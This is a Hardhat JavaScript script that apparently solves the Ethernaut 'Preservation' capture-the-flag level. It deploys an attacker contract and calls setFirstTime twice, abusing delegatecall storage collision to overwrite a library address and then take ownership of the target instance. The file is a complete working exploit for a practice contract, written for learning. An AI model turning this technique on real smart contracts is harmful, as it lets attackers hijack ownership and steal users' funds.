const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    // Get the contracts
    const Preservation = await ethers.getContractFactory("Preservation");
    const HackPreservation = await ethers.getContractFactory("HackPreservation");

    // Instance
    let preservation = Preservation.attach(instance_address);

    console.log(`timeZone1Library = ${await preservation.timeZone1Library()}`);
    console.log(`timeZone2Library = ${await preservation.timeZone2Library()}`);
    console.log(`owner = ${await preservation.owner()}`);
    console.log('');

    // Deploy the HackPreservation contract
    hack = await HackPreservation.deploy();
    await hack.deployTransaction.wait(10);
    console.log(`HackPreservation contract deployed at ${hack.address}`);
    console.log('');

    console.log(ethers.utils.hexZeroPad(hack.address, 32));
    console.log("Setting first address to HackPreservation address");
    let tx = await preservation.setFirstTime(ethers.utils.hexZeroPad(hack.address, 32));
    await tx.wait(10);  // Wait for 10 confirmations
    console.log(`timeZone1Library = ${await preservation.timeZone1Library()}`);
    console.log(`timeZone2Library = ${await preservation.timeZone2Library()}`);
    console.log(`owner = ${await preservation.owner()}`);
    console.log('');

    // Call again to change owner
    console.log(ethers.utils.hexZeroPad(hack.address, 32));
    console.log("Setting first address to HackPreservation address");
    tx = await preservation.setFirstTime(ethers.utils.hexZeroPad(hack.address, 32), {gasLimit: 85000});
    await tx.wait(10);  // Wait for 10 confirmations
    console.log(`timeZone1Library = ${await preservation.timeZone1Library()}`);
    console.log(`timeZone2Library = ${await preservation.timeZone2Library()}`);
    console.log(`owner = ${await preservation.owner()}`);
    
    console.log('Success!');

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0xB6f805F27B9351D8c0206E5C9BFe68585b3E4397';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
